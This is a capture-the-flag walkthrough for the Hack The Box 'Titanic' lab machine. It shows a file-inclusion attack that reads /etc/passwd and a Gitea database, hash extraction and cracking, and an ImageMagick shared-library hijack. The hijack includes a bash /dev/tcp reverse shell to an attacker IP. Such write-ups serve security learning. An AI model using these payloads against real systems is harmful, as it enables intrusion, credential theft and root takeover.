# HTB Titanic Box


### Ping the Machine
### Do Enum (found ssh and tcp on port 80)

## Start by looking for vulnerabilities on the webpage

- Create a ticket on the website (notice that we got a JSON file as a response)
- Run Dirsearch on the website (found `/download` and `/book`, and both seem to require arguments)
- `/download` definitely seems to be vulnerable as when we run it alone:
  ```
  http://titanic.htb/download
  ```
  we get "ticket not found" as a response, which means it takes `ticket` as an argument.

The ticket we created previously had the name:

```
59be286b-a172-4bf7-8c8e-3fb0c6793417.json
```

Try this:

```
http://titanic.htb/download?ticket=59be286b-a172-4bf7-8c8e-3fb0c6793417.json
```

and notice that the ticket file was downloaded again.

This means it has poor sanitation and possibly introduces a **Local File Inclusion (LFI)** vulnerability.

Try this:

```
http://titanic.htb/download?ticket=/etc/passwd
```

and see it being downloaded (this means files are exposed), confirming we can exploit LFI.

---

### Exploring the Files

- The obtained file shows users and services on the machine. There is a `developer` user.
- However, the password is not included (sometimes the password hash could be included there).
- Try also `/etc/shadow`, but we don't have access to it (seems accessible only by root).
- Try `/etc/hosts` to see:
  ```
  127.0.0.1 localhost titanic.htb dev.titanic.htb
  127.0.1.1 titanic
  ```
  and notice this `dev.titanic.htb` subdomain.

We traverse to it on the web (after adding this path to `/etc/hosts` 😉) and find a webpage with:

> "Gitea: Git with a cup of tea" as the title.

---

### Exploring Gitea

- Navigate to the **Explore** tab, and we see 2 Gitea repositories for the developer.
- In `docker-config/mysql/docker-compose.yml`, we find sensitive data (but my solution does not use it):
  ```
  MYSQL_ROOT_PASSWORD: 'MySQLP@$$w0rd!'
  MYSQL_DATABASE: tickets
  MYSQL_USER: sql_svc
  MYSQL_PASSWORD: sql_password
  ```
- In `docker-config/gitea/docker-compose.yml`, we see an important path:
  ```
  /home/developer/gitea/data:/data
  ```
  The Gitea database could be located there.

After some testing, we successfully download the database with:

```
curl -s http://titanic.htb/download?ticket=/home/developer/gitea/data/gitea/gitea.db -o gitea.db
```

#### Extracting Credentials from Gitea Database

```sh
sqlite3 gitea.db
sqlite> .tables
sqlite> SELECT * FROM user;
```

Now, extract the credentials:

```sh
sqlite> .headers on;
sqlite> SELECT lower_name, passwd, salt FROM user;
```

Output:

```
lower_name|salt|passwd
administrator|2d149e5fbd1b20cf31db3e3c6a28fc9b|cba20ccf927d3ad0567b68161732d3fbca098ce886bbc923b4062a3960d459c08d2dfc063b2406ac9207c980c47c5d017136
developer|8bf3e3452b78544f8bee9400d6936d34|e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56
```

To crack the password, we use **Hashcat**.
First, convert the password into the required format:

```
sha256:<iterations>:<salt_b64>:<hash_b64>
```

Use the script from here to reach this format: [https://github.com/unix-ninja/hashcat/blob/master/tools/gitea2hashcat.py](https://github.com/unix-ninja/hashcat/blob/master/tools/gitea2hashcat.py)

After formatting, run:

```sh
hashcat -m 10900 gitea_hash.txt rockyou.txt
```

(Administrator password does not exist in rockyou.txt wordlist, but we find the **developer** password!). Nice, now we have developer password.

---

### SSH Access

```sh
ssh developer@10.10.11.55
```

Inside `/home/developer`, we find **user.txt** with the user flag:

```sh
cat user.txt
```

---

## Privilege Escalation

After spending time on LinPEAS and other common methods, we refer to this write-up for a direction:
[https://infosecwriteups.com/hackthebox-titanic-writeup-5f549dd90f38](https://infosecwriteups.com/hackthebox-titanic-writeup-5f549dd90f38)

It highlights an **ImageMagick Exploit** (for versions **7.1.1-35 or less**), which allows **arbitrary code execution**.

### Understanding the Exploit

The script at `/opt/scripts/identify_images.sh` contains:

```sh
cd /opt/app/static/assets/images
truncate -s 0 metadata.log
find /opt/app/static/assets/images/ -type f -name "*.jpg" | xargs /usr/bin/magick identify >> metadata.log
```

### Exploiting ImageMagick

The **ImageMagick** library scans the folder mentioned in `identify_images.sh` **regularly** (which is `/opt/app/static/assets/images/` in this case), likely when the webpage is refreshed. By crafting a **malicious shared library**, we execute arbitrary commands when `identify` processes it.

#### The payload using "shared library approach" would be created like this (under the same images folder):

```sh
gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
#include <stdio.h>
#include <stdlib.h>
__attribute__((constructor)) void init(){
    system("cat /root/root.txt > /tmp/root.txt");
    exit(0);
}
EOF
```

After you create it, wait a little, and refresh the webpage (in Firefox in my case), and try doing `cat tmp/root.txt` to see the root flag.

However, if you want to create a **reverse shell** payload, you can do the following:

```sh
gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
#include <stdio.h>
#include <stdlib.h>
__attribute__((constructor)) void init(){
    system("/bin/bash -c '/bin/bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1'");
    exit(0);
}
EOF
```

Replace `<YOUR_IP>` with `0.0.0.0` or your specific IP if different.

Then immediately run:

```sh
nc -lvnp 4444
```

And refresh the page (Firefox in my case) to see that you have caught a **shell running with root privileges**. You can prove it by navigating to the root folder.&#x20;

Nice job, you solved it! 🎉

